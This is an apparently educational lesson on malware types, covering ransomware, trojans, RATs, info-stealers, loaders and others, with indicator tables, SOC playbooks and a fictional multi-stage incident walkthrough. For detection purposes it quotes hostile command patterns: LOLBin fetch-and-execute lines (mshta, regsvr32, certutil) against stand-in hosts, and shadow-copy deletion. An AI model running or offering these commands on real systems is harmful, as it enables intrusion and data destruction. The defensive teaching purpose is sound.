# Malware Types and Behavior

"Malware" is a single word that hides a zoo. A ransomware affiliate, a banking trojan operator, a cryptojacker, a state-sponsored RAT crew, and the kid running adware-as-a-service all ship "malware" — but their goals, propagation paths, persistence tricks, and the artefacts they leave behind are wildly different. Triaging an alert as "malware infection" without classifying which *kind* is like a doctor writing "patient is sick" and going home.

This lesson is a working taxonomy. For each major family we cover **what it does**, **how it spreads**, **how it persists**, and **what it looks like in your telemetry**. The goal is that when an EDR alert or a sandbox report lands on your desk, you can read the behaviour, name the family, and reach for the right playbook in minutes — not hours.

## Why this matters

Every incident-response engagement begins the same way: a phone rings, an EDR alert fires, a user reports something weird. The first question the responder must answer is not "who attacked us?" but "**what kind of thing is this?**" The answer changes everything downstream — containment priority, which logs to pull first, whether to isolate or quarantine, whether negotiation is even on the table, what the legal team needs to know in the next 60 minutes.

A ransomware infection demands network isolation in minutes — every additional minute of dwell is more files encrypted. A banking trojan demands a credential-rotation sweep across the user's accounts. A cryptominer is rarely an emergency but signals a broader access problem. A RAT may indicate a long-dwell adversary still on the network. A worm requires segment-level containment to stop lateral spread. A logic bomb may not be active *yet* and the fuse may or may not have been lit. The classification is the trigger for the right playbook.

A second reason to know the taxonomy: malware families are how the threat-intel ecosystem talks. CTI reports, sandbox verdicts, ATT&CK Software entries, and CISA advisories all use family names (LockBit, Emotet, RedLine, NjRAT, Conficker). A SOC that cannot map "we saw RedLine" to "this is an info-stealer, expect credential exfiltration to a Telegram bot, and pivot to browser-stored secrets" wastes the one shared language defenders have.

Finally, the taxonomy changes. Fileless attacks, living-off-the-land techniques, ransomware-as-a-service, and AI-assisted polymorphism all blur historical category boundaries. A modern intrusion is often *multiple families chained* — loader drops infostealer, infostealer hands off to RAT, RAT eventually deploys ransomware. Knowing the families lets you read the chain.

## Core concepts

### Malware vs PUA

Not everything an antivirus flags is malware in the criminal sense. Vendors distinguish:

- **Malware** — software designed to cause harm (encrypt files, steal credentials, open backdoors). Removal is non-negotiable.
- **PUA / PUP (Potentially Unwanted Application / Program)** — software that is annoying or privacy-invasive but not strictly malicious: browser toolbars bundled with free downloads, registry cleaners that "find" hundreds of fake errors, game launchers that install telemetry. Often legal, often distributed with consent buried in EULAs.
- **Bloatware** — pre-installed manufacturer apps that consume resources but are technically legitimate.
- **Greyware** — umbrella term for PUAs, adware, spyware-lite tools, and similar borderline cases.

The line matters operationally. A PUA in the EDR queue might be tuned out as policy noise; a true malware detection of the same severity must be quarantined and investigated. Many programs maintain separate response SLAs for the two.

### Ransomware

Ransomware encrypts the victim's files (or whole disks) and demands payment for the decryptor. Modern variants typically chain at least three monetisation layers:

- **Encryption** — symmetric encryption of files in place, with the key sealed under an attacker-controlled asymmetric key. AES-256 + RSA-2048 is the canonical pattern.
- **Double extortion** — exfiltrate data *before* encrypting, threaten to leak it on a public name-and-shame site if the ransom is not paid even if the victim has backups.
- **Triple extortion** — additionally DDoS the victim, harass their customers, or notify regulators to apply pressure.

Notable families: **LockBit** (RaaS, very active 2022–2024 until law-enforcement disruption), **Conti** (collapsed 2022 after internal leaks; spawned successors like Black Basta), **REvil**, **BlackCat / ALPHV**, **Royal**, **Akira**, **Play**, **Clop** (specialised in supply-chain mass exploitation — MOVEit, GoAnywhere). Indicators: ransom-note files (`README.txt`, `_HOW_TO_DECRYPT.html`), changed file extensions (`.lockbit`, `.conti`), shadow-copy deletion (`vssadmin delete shadows /all`), `wbadmin` tampering, mass file-rename SMB activity.

Most modern ransomware ships as **Ransomware-as-a-Service (RaaS)** — the developer maintains the encryptor and leak-site infrastructure; affiliates pay a percentage of every successful payment. The model means the *technique* of LockBit can outlive the brand, and the *brand* can persist long after the developers retreat.

### Trojans and banking trojans

A **trojan** is software that disguises malicious functionality behind a benign or expected one — a fake invoice PDF that also installs a backdoor, a cracked game with a keylogger, a "tax form" macro that drops a loader. The trojan is a delivery pattern more than a payload type; the payload itself is usually one of the other families.

**Banking trojans** are a specialised subclass that hooks into browsers or the OS to capture credentials and session tokens for online banking, payment, and crypto-wallet sites. Classic examples: **Zeus / ZeuS** (2007-, source code leaked), **Emotet** (banking trojan turned loader-as-a-service), **TrickBot**, **QakBot**, **IcedID**, **Dridex**, **Ursnif**. Modern bankers often pivot to web-injects (modifying the page DOM live) and OAuth/MFA-token theft. They tend to live in `%APPDATA%`, set Run-key persistence, and beacon to fast-flux domains.

### Remote-Access Trojans (RATs)

A RAT gives the operator interactive control of the compromised host: shell, file transfer, screen capture, keystrokes, webcam, microphone. RATs span the spectrum from script-kiddie tools to nation-state implants.

Public/criminal RATs: **DarkComet**, **NjRAT** (very popular in MENA region), **Quasar** (open-source, widely abused), **AsyncRAT**, **Remcos**, **NetWire**, **Adwind / jRAT**. Commercial red-team tools that get reused by attackers: **Cobalt Strike Beacon**, **Sliver**, **Brute Ratel**. Indicators: persistent outbound connection to a fixed C2 (often a Dynamic DNS hostname or a free-tier hosting provider), encoded PowerShell, scheduled tasks, registry Run keys, mutexes specific to the family.

A subtlety: the gap between "criminal RAT" and "red-team C2" has narrowed. Many ransomware crews use cracked Cobalt Strike or open-source Sliver as their RAT, which means a defender who can detect Cobalt Strike's default Malleable-C2 profile and JA3 fingerprint also detects a substantial fraction of real intrusions. Treat C2-framework signatures as one of the highest-value detections in your stack.

### Worms

A worm spreads on its own — no user click required — by exploiting a network-reachable vulnerability or weak credentials. Once one host is infected, the worm scans for new targets and re-infects them. Famous worms: **Conficker** (2008-, exploited MS08-067), **WannaCry** (2017, EternalBlue exploit, kill-switch domain), **NotPetya** (2017, masqueraded as ransomware but was a wiper), **Stuxnet** (2010, targeted ICS), **SQL Slammer** (2003, 376 bytes, saturated the internet in 10 minutes).

Worm activity in your logs looks like a single host suddenly opening hundreds of SMB/445, RDP/3389, or RPC connections to internal peers in a short window. Network segmentation, prompt patching of remote-code-execution CVEs, and SMB egress restrictions are the classical defences.

Modern "worms" often blur into ransomware: NotPetya looked like a worm but wiped, BadRabbit propagated via SMB and dropped ransomware, the EternalBlue-class exploits are still found in attack toolkits years after patches existed. Treat any unpatched internet-reachable SMB/RPC service as a worm magnet and a regulator's audit finding waiting to happen.

### Spyware and info-stealers

Spyware quietly observes — keystrokes, clipboard, screenshots, browser history, cookies, saved credentials. **Info-stealers** are the modern criminal subclass: a single-shot binary that runs once, scrapes everything monetisable from the host, exfiltrates to a Telegram bot or HTTP drop, and exits.

Active families: **RedLine** (browser passwords, crypto wallets, FTP creds, Discord, Steam), **Vidar**, **Lumma / LummaC2**, **Raccoon**, **StealC**, **Atomic Stealer (AMOS)** for macOS. The exfiltrated data ends up on stealer-log marketplaces (Russian Market, Genesis before takedown) where ransomware affiliates buy initial access. Spotting an infostealer fast — before the data hits the marketplace — limits the blast radius.

Practically, an infostealer hit on one workstation is a credential-rotation event, not a quarantine event. The malware is gone within minutes; the credentials it took will be tried against your VPN, your VDI, your SSO portal, and every consumer service the user reused passwords on. Response should focus on rotating, revoking sessions, and forcing MFA re-enrolment — not on hunting a binary that already self-deleted.

### Bloatware

Bloatware is pre-installed software bundled by OEMs (PC manufacturers, phone vendors) that the user did not request: vendor toolbars, "PC tune-up" utilities, free trials of office suites, telemetry agents. Not strictly malicious, but degrades performance, expands attack surface (vendor utilities have historically had RCEs — see Lenovo Superfish, Dell SupportAssist), and complicates baselining.

Best practice for `example.local` workstations: re-image fresh from a trusted Windows ISO during onboarding rather than running the OEM image; track which OEM agents survive imaging and document them.

### Viruses

A "virus" in the strict classical sense is malicious code that **attaches itself to a host program or file** and runs when the host runs. The categories overlap heavily with modern malware but the historical distinctions still appear in vendor naming:

- **File-infector viruses** — patch executable files (PE on Windows, ELF on Linux) so the virus runs before the legitimate code (`Sality`, `Virut`, `Ramnit`).
- **Boot-sector viruses** — overwrite the MBR/VBR; rare on modern UEFI systems but the category survives in MBR bootkits.
- **Macro viruses** — VBA inside Office documents (`Melissa` 1999, `ILOVEYOU` 2000 conceptually). Still alive today via phishing-attached `.docm`, `.xlsm`.
- **Multi-partite** — combine several of the above.

In casual usage "virus" is often used as a synonym for "malware"; in a SOC ticket, prefer the more specific term.

### Polymorphic viruses

Polymorphic malware **rewrites its own code on each infection** so that the byte sequence (and hash) of every sample is different, defeating signature-based AV. Techniques: encrypted body with a mutating decryptor stub, instruction substitution (replace `mov eax, 0` with `xor eax, eax`), code reordering, junk-instruction insertion, register renaming.

A close cousin, **metamorphic**, rewrites the code itself rather than wrapping an encrypted body. Defences: behavioural detection (the malware *acts* the same even if its bytes change), generic unpacking by sandboxes, YARA rules on memory after unpack rather than on disk.

The practical implication is that **hash-based blocking only stops yesterday's exact build**. A polymorphic family producing thousands of unique samples per day overwhelms hash feeds within hours. The detection that scales is the one that fires on the *unpacked memory image* or the *behavioural signature* — both of which sit higher on the Pyramid of Pain than the disk hash.

### Fileless and Living-off-the-Land (LotL)

Fileless malware never writes its main payload to disk. The implant lives in memory — typically injected into a legitimate process — and persistence is achieved through registry keys, WMI subscriptions, scheduled tasks holding encoded scripts, or rerunning a one-liner on logon.

Living-off-the-Land takes this further: the attacker uses *only built-in OS binaries* (LOLBins). Examples: `powershell.exe -enc <base64>`, `mshta.exe http://…`, `regsvr32.exe /s /u /i:http://… scrobj.dll` (Squiblydoo), `certutil -urlcache -f http://… payload.exe`, `wmic process call create`, `bitsadmin /transfer`, `msbuild.exe inline-task`. No new EXE on disk means no hash to match and a much harder detection problem. Defences: PowerShell Script Block Logging (Event ID 4104), AMSI integration, command-line auditing, Sysmon, AppLocker / WDAC for LOLBin restriction.

The LOLBAS project catalogues hundreds of built-in Windows binaries and their abuse cases; the macOS GTFOBins-style equivalent (`LOOBins`) does the same for macOS. Defenders who do not at least baseline which LOLBins ever execute legitimately in their environment have no chance of spotting their malicious use, because every LOLBin is a Microsoft-signed binary that runs on every host every day for benign reasons.

### Keyloggers

Keyloggers record keystrokes (and often clipboard, mouse, screen). Two physical tiers:

- **Software keyloggers** — hook the Windows keyboard API (`SetWindowsHookEx`), use raw input, or read directly from `/dev/input` on Linux. Easy to deploy, easy for AV to detect by the API hook pattern.
- **Hardware keyloggers** — a USB pass-through dongle between keyboard and PC, or a chip soldered into the keyboard. Invisible to the OS, defeated only by physical inspection. Threat model: insider attacks on shared workstations, kiosks.

MFA limits the damage from a captured password but does not prevent session-cookie or token theft once the attacker is on the box.

### Logic bombs

A logic bomb is malicious code embedded in a larger (often legitimate) program that activates only when a condition is met — a date, a missing employee record, a specific user logging in. Insider-threat scenario: a disgruntled developer plants code that wipes data 90 days after their account is removed from the directory.

Detection is hard because the code is dormant; defences are organisational (code review, separation of duties, mandatory review for production deploys, monitoring for unusual file or environment-variable access patterns).

### Rootkits

A rootkit hides the attacker's presence — files, processes, network connections, registry keys are all filtered out of the views OS APIs return. Tiers by privilege depth:

- **User-mode rootkits** — DLL injection, IAT/EAT hooking, API patching. Easier to write, easier to detect with EDR.
- **Kernel-mode rootkits** — kernel drivers that hook SSDT, IDT, or modern `KeBugCheck` hooks; manipulate kernel objects directly (DKOM). Require signed drivers on modern Windows; attackers exploit Bring-Your-Own-Vulnerable-Driver (BYOVD).
- **Bootkits / UEFI rootkits** — sit below the OS, in the boot chain or firmware (`LoJax`, `MoonBounce`, `BlackLotus`). Survive OS reinstalls; require firmware reflashing or hardware replacement to remove.

Detection often requires offline imaging, memory forensics, or specialised firmware-integrity scanners (CHIPSEC, vendor tooling).

The cost-benefit of full rootkit hunting is rarely worthwhile for general workstations; reserve deep firmware checks for high-value servers, executive endpoints, and known-targeted environments. For most fleets, "we wipe and re-image on suspicion" is a more practical policy than "we forensically image every laptop monthly."

### Bots and botnets

A **bot** is malware that turns the host into a remote-controlled node. A **botnet** is the swarm of bots under one command. Use cases: DDoS-for-hire, spam, click fraud, credential stuffing, proxying for other criminals, cryptomining at scale.

Notable: **Mirai** (2016, IoT botnet, DynDNS DDoS, source code leaked and forked endlessly into Mozi, Gafgyt, etc.), **Emotet** (botnet-as-a-service for malware delivery), **Necurs**, **TrickBot**. Botnet C2 patterns: IRC (legacy), HTTP/HTTPS to a fixed list of C2s, P2P (Mozi, Hide-and-Seek), DGA (domain-generation algorithms producing thousands of pseudo-random domains daily, of which only a few are registered).

A residential-proxy variant has emerged in recent years: criminals pay for the use of compromised home routers and smart devices as exit nodes for *other* traffic — a way to launder credential-stuffing and account-takeover attempts through IPs that look like normal consumer addresses. The same Mirai-class compromise that powered DDoS in 2016 now powers fraud-as-a-service in 2026.

### Cryptominers and cryptojacking

Cryptojacking malware uses the victim's CPU/GPU to mine cryptocurrency (Monero is the perennial favourite — ASIC-resistant, pool-mineable, privacy-focused). Two sub-flavours:

- **Host cryptominers** — `xmrig` and friends dropped on servers via exposed Docker, Kubernetes, Redis, or vulnerable web apps. Visible as 100% CPU pegged 24/7.
- **Browser cryptojacking** — JavaScript miners (`Coinhive`-style) embedded in compromised websites; mostly dead since Coinhive shut down in 2019, but variants still appear.

Detection is straightforward (CPU saturation, connection to known mining pools), but cryptominers often signal deeper compromise — the access used to deploy a miner could equally have deployed ransomware.

### Adware and PUPs

Adware injects advertisements: browser pop-ups, redirects, modified search-engine defaults. Often bundled with free software downloads. The line between adware, spyware, and PUPs is fuzzy and vendor-specific. Operationally treat as nuisance-tier unless the adware also sideloads other payloads (which several adware ecosystems do — adware is a cheap monetisation that leads back to the same affiliate networks as malware delivery).

### Loaders and droppers

A **loader** (or **dropper**) is the small first-stage payload whose only job is to fetch and execute a larger second stage. Modern intrusions almost always start with a loader: it bypasses initial sandboxes (small footprint, no obvious malice), profiles the host (is it a domain-joined corporate machine? a sandbox VM?), then pulls down the real payload.

Notable loaders: **SmokeLoader**, **GuLoader**, **BumbleBee**, **IcedID** (originally a banker, now mostly a loader), **Hancitor**, **Latrodectus**. Catching the loader stage is the cheapest detection — once the second stage runs, a lot more has to go right.

Loaders often abuse legitimate-signed binaries via **DLL side-loading**: drop the loader DLL next to a renamed signed EXE that imports it; the OS happily loads the malicious DLL because the EXE is signed. This is one of the most popular evasion patterns of 2024–2026 and bypasses naïve "block unsigned code" policies.

## Malware taxonomy diagram

```mermaid
flowchart TB
    Mal[Malware]
    Mal --> Money[Financial]
    Mal --> Espionage[Espionage / Surveillance]
    Mal --> Disrupt[Disruption / Sabotage]
    Mal --> Resource[Resource Theft]
    Mal --> Delivery[Delivery / Foothold]
    Mal --> Nuisance[Nuisance / Greyware]

    Money --> Ransom[Ransomware]
    Money --> Banker[Banking trojan]
    Money --> Stealer[Info-stealer / spyware]

    Espionage --> RAT[RAT]
    Espionage --> Keylog[Keylogger]
    Espionage --> Rootkit[Rootkit / bootkit]

    Disrupt --> Worm[Worm]
    Disrupt --> Wiper[Wiper]
    Disrupt --> Logic[Logic bomb]

    Resource --> Crypto[Cryptominer]
    Resource --> Bot[Bot / botnet node]

    Delivery --> Loader[Loader / dropper]
    Delivery --> Trojan[Trojan]
    Delivery --> Virus[File-infector virus]

    Nuisance --> Adware[Adware]
    Nuisance --> PUP[PUP / PUA]
    Nuisance --> Bloat[Bloatware]
```

The grouping is by **primary purpose**, but real samples cross categories: a banker can become a loader, a loader can drop ransomware, a RAT can deploy a cryptominer to monetise idle access. Treat the diagram as a starting taxonomy, not a strict partition.

## Lifecycle of a typical infection

Setting families aside for a moment, the *shape* of a typical infection is consistent enough to be worth memorising:

1. **Delivery** — phishing email, drive-by download, supply-chain compromise, exposed service, USB. The malware arrives.
2. **Execution** — user click, exploit, autorun. The first instruction runs in the victim's process space.
3. **Defence evasion** — packing, obfuscation, sandbox checks, AMSI bypass, AV-product enumeration. The implant tries not to be seen.
4. **Persistence** — registry run keys, scheduled tasks, services, WMI subscriptions, startup folder. Surviving reboot.
5. **Discovery** — `whoami`, `net group "Domain Admins"`, AD enumeration, network mapping. Where am I and what can I reach?
6. **Lateral movement** — RDP, SMB, WMI, PsExec, PowerShell remoting. Hopping from foothold to target.
7. **Collection** — staged data on the box; archives in `%TEMP%` or `\Users\Public\`.
8. **Exfiltration** — HTTPS to attacker-controlled bucket, DNS tunnelling, transfer to a misused cloud-storage app.
9. **Impact** — encryption, wiper, public extortion, data sale, manipulation of business data.

Mapping each indicator and each family onto this lifecycle is what ATT&CK's tactics columns codify. A SOC that asks "which lifecycle phase did this alert fire in?" gets to the right next-step faster than one that just looks at severity scores.

## Common indicators per family

| Family | Host artefacts | Network beacons | Persistence |
|---|---|---|---|
| Ransomware | `README*.txt`, changed extensions, shadow-copy deletion | TOR onion C2, leak-site URLs | Often ephemeral (one-shot) |
| Banking trojan | DLL injection into browsers, web-inject configs | Fast-flux domains, HTTPS to C2 | Run keys, scheduled tasks |
| RAT | Mutexes (family-specific), encoded PS, screen-capture buffers | Long-lived TCP/HTTPS to DDNS host | Run keys, services, WMI subs |
| Worm | Mass SMB/RPC/RDP probes from one host | Internal scan traffic; SMB exploit packets | Often none — speed over stealth |
| Info-stealer | Browser DB reads (`Login Data`, cookies) | HTTP POST to `/gate.php`, Telegram API | One-shot, no persistence |
| Bloatware | OEM utility binaries in `Program Files` | Telemetry to vendor | Vendor services (legitimate) |
| File-infector virus | Modified PEs, anomalous section sizes | Often offline | Infected files re-execute |
| Polymorphic | Different hash per sample, same behaviour | Variable | Same as parent family |
| Fileless / LotL | No new EXE; encoded PS in registry/WMI | LOLBin egress patterns | Registry, WMI, scheduled tasks |
| Keylogger | Hook DLL, log file in `%APPDATA%` | Email/HTTP exfil periodically | Run keys |
| Logic bomb | Code in legitimate app | Often none | Inside the host program |
| Rootkit | Hidden files/processes; SSDT hooks; unsigned drivers | Often quiet | Driver, firmware, MBR |
| Bot | Connection to IRC/HTTP C2, DGA queries | DGA, P2P, IRC | Run keys, services |
| Cryptominer | 100% CPU; `xmrig`-like binaries | Mining-pool domains, Stratum protocol | systemd, Run, services |
| Adware | Browser-extension or proxy modifications | Ad-network domains | Browser extensions, services |
| Loader | Small unsigned EXE/DLL; sandbox-evasion checks | Fetches second stage from CDN | Often hands off to its payload |

The artefact set is the cheat sheet a tier-2 analyst keeps next to the SIEM. Each row collapses hours of incident-response experience into "if you see X, suspect Y."

## Hands-on / practice

1. **Sandbox a sample.** Take a benign EICAR-style test or a sample from MalwareBazaar that you are licensed to handle, detonate in ANY.RUN or a personal Cuckoo / `example.local`-isolated VM. Capture the process tree, network traffic, dropped files, and registry writes. Classify the sample using the taxonomy above — write a one-paragraph "this is X because Y" justification. Compare your verdict to the public sandbox tag.
2. **PCAP family identification.** Download a Cobalt Strike beacon PCAP and a Mirai IoT-scan PCAP from Malware Traffic Analysis. Without reading the filenames, identify each by traffic shape: regular interval beaconing vs aggressive port scanning. Document the JA3 fingerprints, top destinations, and DNS patterns. Map each to the taxonomy.
3. **Ransomware decryptor lookup.** Take a fictional `example.local` ransomware note (or a public one from No More Ransom) and walk through the No More Ransom decryptor catalogue and ID Ransomware: which family did the note come from? Is a free decryptor available? Document the indicators (file extension, ransom-note name, contact email/onion) used to identify it.
4. **Polymorphic detection exercise.** Take a benign program, generate three "variants" using simple instruction substitution (assemble the same source with three different optimisation levels — `-O0`, `-O2`, `-Os`). Compute SHA-256 of each. Write a YARA rule keyed on a stable string (a copyright line, an unusual import) that matches all three despite different hashes. Which indicators survived? Which did not?
5. **Fileless via PowerShell logs.** Enable PowerShell Script Block Logging (`Enable-PSRemoting; Set-LogProperty 4104`) on a test workstation. Run a deliberately-crafted "fileless-style" command (`powershell -nop -w hidden -enc <base64>` decoding to a benign `Get-ChildItem`). In Event Viewer (`Microsoft-Windows-PowerShell/Operational`, Event ID 4104), find the decoded script block. Write a Sigma rule that catches the encoded-command pattern from any non-admin parent process.

## Worked example — `example.local` IR walks a multi-stage infection

It is a Tuesday afternoon at `example.local`. The SOC's EDR fires a high-severity alert: `vssadmin.exe delete shadows /all /quiet` ran on workstation `WS-FIN-014`. By the time the on-call responder, Murad, opens the case, three more workstations in the finance VLAN are showing the same alert. He pulls the thread.

**Stage 0 — Phishing.** Email logs show that 90 minutes earlier, twelve `example.local` finance staff received an email from `invoices@payroll-update.tld` (typo-squat of a real vendor) with a `.zip` attachment. Three users opened it; one ran the `.lnk` shortcut inside, which executed `mshta.exe https://cdn-update.example.tld/r.hta`. **Classification: trojan delivery, LOLBin (mshta) execution.** No EXE was written to disk yet — the HTA is fileless.

**Stage 1 — Loader.** The HTA decoded a base64 PowerShell that contacted `cdn-update.example.tld` and downloaded a small DLL, sideloaded via a renamed legitimate signed binary (`OneDrive.exe` -> `OneDrive.dll`). The DLL fingerprints the host (domain-joined? VM? AV product?) and beacons every 47 seconds with low jitter to an HTTPS endpoint. **Classification: loader, fileless until DLL drop, LotL via signed binary side-loading.**

**Stage 2 — Info-stealer.** Within 20 minutes the loader pulled down a RedLine-family info-stealer. RedLine read the user's Chrome `Login Data` SQLite database, exfiltrated cookies and saved credentials over HTTPS to a `.ru` Telegram-API endpoint, scraped Discord and Steam tokens, then deleted itself. By the time Murad sees it, the stealer's binary is gone but the artefacts are in the EDR's process record. **Classification: info-stealer; expect credential reuse against the user's online accounts within hours.**

**Stage 3 — RAT hand-off.** The stolen credentials apparently were *not* the goal — they were a side hustle. The loader stayed live and pulled a Cobalt Strike Beacon as the third stage, with its operator profile mimicking Microsoft Update traffic. The Beacon ran for 18 hours mapping the network: SMB shares, AD groups, finance file servers, the backup server. **Classification: RAT (commercial red-team tool repurposed); long-dwell phase.**

**Stage 4 — Ransomware.** At 16:42 the operator pivoted: pushed an Akira-family ransomware payload to seven file servers and four workstations via PsExec from a compromised admin account whose password was in the RedLine dump from earlier. Ransomware: deletes shadow copies, kills backup services, encrypts SMB shares, drops `akira_readme.txt`. **This is the alert that Murad first saw.** By the time he isolates the VLAN, ~18% of the finance share is encrypted.

**Containment.** Murad isolates the entire finance VLAN at the firewall, kills the `OneDrive.dll` side-loaded process on all hosts, force-rotates AD passwords for any account that touched the affected machines in the past 72 hours, and pulls the EDR's full process trees for memory-forensic later. Backups (offline copy, immutable storage) are intact — restoration begins by midnight.

**After-action.** The infection was *one chain of five malware families*: trojan delivery, loader, info-stealer, RAT, ransomware. Each stage demanded different telemetry and a different playbook. The earliest opportunity to break the chain was Stage 0 (the user click) or Stage 1 (the LOLBin pattern of `mshta.exe` fetching remote HTA — an existing Sigma rule that had been disabled for noise three months earlier). The team re-enables the rule, tunes it, and adds a finance-VLAN egress restriction blocking outbound HTA execution. The lesson: **classification at every stage is what tells the responder which playbook to run** — and the rule that would have caught Stage 1 was already written.

Murad's after-action note: *"We had the detection. We tuned it out. The taxonomy reminds us what each family looks like; the discipline is to keep the rules live."*

A second `example.local` lesson: each stage's containment depended on logs from a different layer. Stage 0 was an email-gateway question. Stage 1 was an EDR command-line question. Stage 2 was a network-egress question. Stage 3 was a Sysmon network-and-process question. Stage 4 was a file-server audit-log question. A SOC missing logs at any one layer would have been blind to that stage of the chain. **Detection coverage is a stack, not a single product.**

## Troubleshooting & pitfalls

- **Confusing delivery with payload.** "Trojan" describes how it arrived; the *payload* (RAT, stealer, ransomware) is what matters operationally. Always log both.
- **Single-family bias.** Modern intrusions chain families. A "ransomware incident" usually started as a phishing-loader-RAT chain weeks earlier. Investigate backwards.
- **Hash-only IOC blocking.** Polymorphic and packed samples produce a new hash per build. Hash blocks help but never finish the job — pair with behavioural rules.
- **Sandbox evasion.** Many loaders detect VM artefacts (CPU count, MAC OUI, domain-join state) and stay dormant in sandboxes. A clean sandbox verdict is not the same as "this file is benign."
- **Living-off-the-Land blindness.** If `powershell.exe`, `wmic`, `mshta`, `rundll32`, `regsvr32`, and `bitsadmin` are unrestricted in your environment, a sizeable portion of modern malware leaves no EXE for AV to find.
- **Bloatware noise drowning real signal.** OEM agents trigger AV alerts and SIEM dashboards routinely; tuning them out is necessary but accidentally tunes out adjacent legitimate detections.
- **"It's just a cryptominer" complacency.** A miner means the attacker had RCE. The same access could deploy ransomware tomorrow.
- **PUA versus malware mis-classification.** A genuinely malicious sample mis-tagged as PUA by one vendor sits in the queue while the operator finishes their work. Cross-reference at least two engines for borderline cases.
- **Macro-disabled-by-default complacency.** Microsoft now blocks internet-tagged macros by default, which has shifted attackers to `.lnk`, `.iso`, `.img`, `.svg`, OneNote, and HTML smuggling. Update detection accordingly.
- **Underestimating logic bombs.** Insider-planted code can sit dormant for years. Code review and separation-of-duties matter; technical detection is hard.
- **Rootkit blind spots.** Live-system AV cannot see what a kernel rootkit hides. Periodic offline imaging and memory captures are the only reliable check.
- **Ransomware backup theatre.** Offline backups defeat ransomware *only* if they are tested for restoration. Many `example.local`-style organisations discover at hour 2 of an incident that the backups are corrupt or incomplete.
- **Treating fileless as undetectable.** Fileless malware leaves enormous telemetry (PowerShell 4104, AMSI events, WMI subscriptions, Sysmon Event 1/3/7/13). The detection problem is logging coverage, not impossibility.
- **Botnet IoT blind spot.** Mirai-class botnets infect routers, cameras, and printers — devices the SOC often does not monitor. Add IoT/OT segments to telemetry.
- **DGA hash-blocking is futile.** Domain-generation algorithms produce thousands of candidates per day. Detect on the *pattern* (high-entropy, never-resolved subdomains) not the specific names.
- **"Free" tools that bundle adware.** Junior staff installing utility software from third-party download sites brings PUPs into the corporate fleet. Software-deployment policy and AppLocker matter.
- **MFA defeats keyloggers? Partially.** A keylogged static password is useless against MFA, but session-cookie or token theft after authentication still works. Treat keylog-on-managed-host as session-compromise, not just password-compromise.
- **Worm propagation in flat networks.** A flat /16 corporate network is a worm's playground. Segment by function and enforce east-west firewall rules — assume an internal worm will appear someday.
- **Decryptor optimism.** Some ransomware families have public decryptors (No More Ransom). Many do not, and the ones with decryptors often only work for older versions. Restoration from offline backups is the durable answer.
- **Attribution distraction.** "Was it Conti or BlackBasta?" is interesting; "did it spread laterally yet?" is urgent. Containment first, attribution later.

## From classification to playbook

Once a sample is classified, the playbook ought to be predictable. A short mapping that `example.local`'s SOC keeps printed next to the on-call desk:

- **Ransomware** → isolate VLAN, kill encryption process, preserve memory of one infected host, escalate to legal/comms, check backup integrity, prepare regulator notification.
- **Banking trojan / info-stealer** → quarantine endpoint, force credential rotation for the user (corporate + personal accounts they accessed from this host), revoke all active sessions, alert the user.
- **RAT / Cobalt Strike Beacon** → preserve memory image, isolate but do not power off (volatile evidence), threat-hunt laterally for additional implants, expect long dwell — assume more is hidden.
- **Worm** → segment-isolate the source VLAN, urgent-patch the exploited CVE, scan peers for indicators, expect re-infection if the patch is incomplete.
- **Cryptominer** → quarantine, but treat as deeper-compromise indicator — the access used to install the miner could install ransomware tomorrow.
- **Logic bomb** → freeze the affected systems, involve HR/legal, do not delete the code yet (preserve for prosecution), code-review related repositories.
- **Rootkit** → power off, image disk and firmware offline, replace hardware if firmware-resident.
- **Adware / PUA** → ticket-tier remediation, no urgent containment unless the adware is sideloading other payloads.

The mapping is a starting point; production playbooks contain hundreds of details. But having even this one-liner per family on the wall means that the classification step actually drives the response, instead of every incident becoming the same generic "isolate and reimage" reflex.

## Key takeaways

- **Every IR engagement starts with classification.** Naming the family within minutes determines the playbook.
- **Modern intrusions chain families.** Phishing-loader-stealer-RAT-ransomware is a single attack with five names.
- **Behaviour beats hashes.** Polymorphic, packed, and fileless samples evade signature AV by design.
- **Fileless is not undetectable.** It moves the detection cost from disk artefacts to PowerShell, WMI, and process telemetry.
- **Loaders are the cheapest catch.** Detecting the small first-stage saves you from the expensive second stage.
- **Ransomware response is a clock.** Network isolation in minutes, backup-restore plan in hours, regulator notice in days.
- **PUA / bloatware / adware tuning is real work.** Without it, real malware drowns in policy noise.
- **Worms still exist.** Patch SMB-class CVEs immediately and segment your network.
- **Rootkits below the OS need offline tools.** Live-system scans cannot see firmware-resident implants.
- **The taxonomy is a shared language.** CTI reports, ATT&CK Software entries, and vendor advisories use family names — speak the same language back.

## References

- MITRE ATT&CK Software catalogue — [attack.mitre.org/software](https://attack.mitre.org/software/)
- MITRE ATT&CK Groups — [attack.mitre.org/groups](https://attack.mitre.org/groups/)
- CISA Known Exploited Vulnerabilities catalog — [cisa.gov/known-exploited-vulnerabilities-catalog](https://www.cisa.gov/known-exploited-vulnerabilities-catalog)
- CISA StopRansomware — [cisa.gov/stopransomware](https://www.cisa.gov/stopransomware)
- MalwareBazaar (abuse.ch) — [bazaar.abuse.ch](https://bazaar.abuse.ch/)
- ANY.RUN interactive sandbox — [any.run](https://any.run/)
- VirusTotal — [virustotal.com](https://www.virustotal.com/)
- Hybrid Analysis — [hybrid-analysis.com](https://www.hybrid-analysis.com/)
- Joe Sandbox — [joesandbox.com](https://www.joesandbox.com/)
- Malpedia (Fraunhofer FKIE) — [malpedia.caad.fkie.fraunhofer.de](https://malpedia.caad.fkie.fraunhofer.de/)
- No More Ransom Project — [nomoreransom.org](https://www.nomoreransom.org/)
- ID Ransomware — [id-ransomware.malwarehunterteam.com](https://id-ransomware.malwarehunterteam.com/)
- Sysmon (Sysinternals) — [learn.microsoft.com/en-us/sysinternals/downloads/sysmon](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon)
- LOLBAS project (Living-off-the-Land Binaries) — [lolbas-project.github.io](https://lolbas-project.github.io/)
- Unit 42 threat-research blog — [unit42.paloaltonetworks.com](https://unit42.paloaltonetworks.com/)
- Mandiant blog — [cloud.google.com/blog/topics/threat-intelligence](https://cloud.google.com/blog/topics/threat-intelligence)

## Related lessons

- [Attack indicators (IOC and IOA)](./attack-indicators.md) — the artefacts each malware family leaves, encoded for detection.
- [Social engineering](./social-engineering.md) — phishing is how most malware gets in.
- [Initial access](./initial-access.md) — the foothold step that loaders and trojans serve.
- [Network attacks](./network-attacks.md) — worms, botnets, and lateral movement use these techniques.
- [Threat actors and intel](./threat-actors-and-intel.md) — who runs which families, and how to read CTI reports.
- [Investigation and mitigation](../blue-teaming/investigation-and-mitigation.md) — the blue-team workflow that contains a malware incident.
